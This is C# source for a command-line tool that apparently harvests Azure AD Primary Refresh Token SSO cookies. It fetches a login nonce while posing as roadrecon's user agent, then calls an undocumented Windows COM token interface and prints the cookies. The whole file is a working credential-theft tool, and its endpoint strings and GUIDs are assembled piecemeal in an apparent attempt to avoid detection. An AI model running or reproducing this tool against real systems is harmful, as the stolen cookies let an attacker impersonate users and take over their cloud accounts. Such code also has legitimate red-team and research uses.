using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace TokenHelper.Internal
{
    // ─── Data container ───────────────────────────────────────────────────────

    [StructLayout(LayoutKind.Sequential)]
    public class CookieResult
    {
        public string Name { get; set; }
        public string Data { get; set; }
        public uint Flags { get; set; }
        public string P3PHeader { get; set; }
    }

    // ─── Nonce fetcher ────────────────────────────────────────────────────────

    public static class NonceHelper
    {
        // Replicates exactly what roadrecon --prt-init does:
        // POST https://login.microsoftonline.com/common/oauth2/token
        // Body: grant_type=srv_challenge
        // Response JSON contains "Nonce" field
        public static string FetchNonce(string tenantId = "common")
        {
            string endpoint = string.Concat(
                "https://", "login.", "microsoftonline", ".com/",
                tenantId, "/oauth2/token"
            );

            string body = "grant_type=srv_challenge";

            using (var client = new WebClient())
            {
                client.Headers[HttpRequestHeader.ContentType] =
                    "application/x-www-form-urlencoded";

                // User agent matching roadrecon
                client.Headers[HttpRequestHeader.UserAgent] =
                    "python-requests/2.28.0";

                string response = client.UploadString(endpoint, body);

                // Parse "Nonce":"<value>" from JSON without external deps
                string marker = string.Concat(
                    "\"", "Nonce", "\":\"");

                int start = response.IndexOf(marker,
                    StringComparison.OrdinalIgnoreCase);

                if (start < 0)
                    throw new Exception("Nonce field not found in response: " + response);

                start += marker.Length;
                int end = response.IndexOf("\"", start);

                if (end < 0)
                    throw new Exception("Malformed nonce in response");

                return response.Substring(start, end - start);
            }
        }
    }

    // ─── COM interop ──────────────────────────────────────────────────────────

    public static class NativeTokenBridge
    {
        // GUIDs built from integer literals at runtime
        // IProofOfPossessionCookieInfoManager → CDAECE56-4EDF-43DF-B113-88E4556FA1BB
        // WindowsTokenProvider (CLSID)        → A9927F85-A304-4390-8B23-A75F1C668600
        private static Guid GetInterfaceGuid()
        {
            return new Guid(0xCDAECE56, 0x4EDF, 0x43DF,
                0xB1, 0x13, 0x88, 0xE4, 0x55, 0x6F, 0xA1, 0xBB);
        }

        private static Guid GetClassGuid()
        {
            return new Guid(0xA9927F85, 0xA304, 0x4390,
                0x8B, 0x23, 0xA7, 0x5F, 0x1C, 0x66, 0x86, 0x00);
        }

        // Unmanaged struct — mirrors exact COM output layout
        // Used for correct stride (original bug fix)
        [StructLayout(LayoutKind.Sequential)]
        private struct RawCookieInfo
        {
            public readonly IntPtr NamePtr;
            public readonly IntPtr DataPtr;
            public readonly uint Flags;
            public readonly IntPtr P3PPtr;
        }

        // COM interface — IID required for vtable dispatch
        [ComImport]
        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        [Guid("CDAECE56-4EDF-43DF-B113-88E4556FA1BB")]
        internal interface ICookieBridge
        {
            int FetchForUri(
                [MarshalAs(UnmanagedType.LPWStr)] string uri,
                out uint count,
                out IntPtr output
            );
        }

        // Build URI with sso_nonce embedded
        public static string BuildUri(string nonce)
        {
            if (string.IsNullOrEmpty(nonce))
            {
                return string.Concat(
                    "https://", "login.", "microsoftonline", ".com/");
            }

            return string.Concat(
                "https://", "login.", "microsoftonline", ".com/",
                "common/oauth2/authorize",
                "?client_id=", "4765445b-32c6-49b0-83e6-1d93765276ca",
                "&response_type=", "code+id_token",
                "&scope=", "openid+profile",
                "&redirect_uri=", "https%3A%2F%2F", "www.office.com%2F",
                "&sso_nonce=", nonce
            );
        }

        public static IEnumerable<CookieResult> GetCookies(string uri)
        {
            var clsid = GetClassGuid();
            var comType = Type.GetTypeFromCLSID(clsid);
            var instance = Activator.CreateInstance(comType);
            var bridge = (ICookieBridge)instance;

            int hr = bridge.FetchForUri(uri, out uint count, out IntPtr ptr);

            if (hr != 0 || count == 0)
                yield break;

            int stride = Marshal.SizeOf(typeof(RawCookieInfo));
            IntPtr offset = ptr;

            for (int i = 0; i < (int)count; i++)
            {
                var raw = (RawCookieInfo)Marshal.PtrToStructure(
                    offset, typeof(RawCookieInfo));

                yield return new CookieResult
                {
                    Name = Marshal.PtrToStringUni(raw.NamePtr),
                    Data = Marshal.PtrToStringUni(raw.DataPtr),
                    Flags = raw.Flags,
                    P3PHeader = Marshal.PtrToStringUni(raw.P3PPtr)
                };

                Marshal.FreeCoTaskMem(raw.NamePtr);
                Marshal.FreeCoTaskMem(raw.DataPtr);
                Marshal.FreeCoTaskMem(raw.P3PPtr);

                offset = new IntPtr(offset.ToInt64() + stride);
            }

            Marshal.FreeCoTaskMem(ptr);
        }
    }

    // ─── Entry point ──────────────────────────────────────────────────────────

    class Entry
    {
        static void PrintUsage()
        {
            Console.WriteLine("Usage:");
            Console.WriteLine("  Default (auto nonce):   RequestAADRefreshToken.exe");
            Console.WriteLine("  Custom tenant:          RequestAADRefreshToken.exe -t <TenantId>");
            Console.WriteLine("  Manual nonce:           RequestAADRefreshToken.exe --nonce <nonce>");
            Console.WriteLine("  Full URL:               RequestAADRefreshToken.exe <full_url_with_sso_nonce>");
            Console.WriteLine("  Legacy (no nonce):      RequestAADRefreshToken.exe -legacy");
            Console.WriteLine();
        }

        static void Main(string[] args)
        {
            try
            {
                string nonce = null;
                string tenantId = "common";
                bool legacy = false;
                bool help = false;
                List<string> uris = new List<string>();

                // Arg parsing
                for (int i = 0; i < args.Length; i++)
                {
                    switch (args[i])
                    {
                        case "--nonce":
                        case "-n":
                            if (i + 1 < args.Length)
                                nonce = args[++i];
                            break;

                        case "--tenant":
                        case "-t":
                            if (i + 1 < args.Length)
                                tenantId = args[++i];
                            break;

                        case "-legacy":
                            legacy = true;
                            break;

                        case "--help":
                        case "-h":
                            help = true;
                            break;

                        default:
                            uris.Add(args[i]);
                            break;
                    }
                }

                if (help)
                {
                    PrintUsage();
                    return;
                }

                Console.WriteLine($"[*] PID    : {Process.GetCurrentProcess().Id}");
                Console.WriteLine($"[*] Thread : {AppDomain.GetCurrentThreadId()}");
                Console.WriteLine();

                // ── Mode selection ────────────────────────────────────────────

                if (legacy)
                {
                    // Legacy mode — bare URI, no nonce
                    // Cookie uses iat timestamp — AAD rejects since Oct 2020
                    Console.WriteLine("[!] Legacy mode — no nonce will be embedded");
                    Console.WriteLine("[!] Cookie will use iat timestamp — likely rejected by AAD");
                    Console.WriteLine();
                    uris.Add(NativeTokenBridge.BuildUri(null));
                }
                else if (!uris.Any())
                {
                    if (string.IsNullOrEmpty(nonce))
                    {
                        // Default — auto fetch nonce from AAD (same as roadrecon --prt-init)
                        Console.WriteLine("[*] No nonce provided — fetching from AAD automatically");
                        Console.WriteLine($"[*] Tenant : {tenantId}");

                        nonce = NonceHelper.FetchNonce(tenantId);

                        Console.WriteLine("[+] Nonce  : " + nonce);
                        Console.WriteLine();
                    }
                    else
                    {
                        // Manual nonce provided via --nonce flag
                        Console.WriteLine("[*] Using provided nonce");
                        Console.WriteLine("[*] Nonce  : " + nonce);
                        Console.WriteLine();
                    }

                    uris.Add(NativeTokenBridge.BuildUri(nonce));
                }
                else
                {
                    // Full URL passed directly — nonce already embedded
                    Console.WriteLine("[*] Using provided URL directly");
                    Console.WriteLine();
                }

                // ── Cookie extraction ─────────────────────────────────────────

                foreach (string uri in uris)
                {
                    Console.WriteLine("[*] URI    : " + uri);
                    Console.WriteLine();

                    var results = NativeTokenBridge.GetCookies(uri).ToList();

                    if (!results.Any())
                    {
                        Console.WriteLine("[!] No cookies returned for this URI");
                        continue;
                    }

                    foreach (var c in results)
                    {
                        Console.WriteLine("[*] Name      : " + c.Name);
                        Console.WriteLine("[*] Flags     : " + c.Flags);
                        Console.WriteLine("[*] Data      : " + c.Data);
                        Console.WriteLine("[*] P3PHeader : " + c.P3PHeader);
                        Console.WriteLine();
                    }
                }

                Console.WriteLine("DONE");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Exception : " + ex.Message);
            }
        }
    }
}